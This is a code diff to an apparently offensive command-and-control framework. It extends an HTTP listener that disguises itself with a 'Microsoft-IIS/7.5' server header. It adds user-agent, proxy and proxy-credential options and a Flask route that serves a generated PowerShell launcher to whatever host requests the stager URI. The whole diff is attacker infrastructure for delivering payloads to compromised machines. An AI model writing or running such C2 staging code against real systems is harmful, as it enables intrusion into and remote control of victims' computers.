@@ -106,6 +106,26 @@ class Listener:
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'StagerURI' : {
+                'Description'   :   'URI for the stager. Example: stager.php',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'Proxy' : {
+                'Description'   :   'Proxy to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'ProxyCreds' : {
+                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
             }
         }
 
@@ -749,10 +769,23 @@ def send_message(packets=None):
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
+        stagerURI = listenerOptions['StagerURI']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        listenerName = self.options['Name']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
 
         app = Flask(__name__)
         self.app = app
 
+        
+        @app.route('/<string:stagerURI>')
+        def send_stager(stagerURI):
+            if stagerURI:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
+            else:
+                pass
         @app.before_request
         def check_ip():
             """
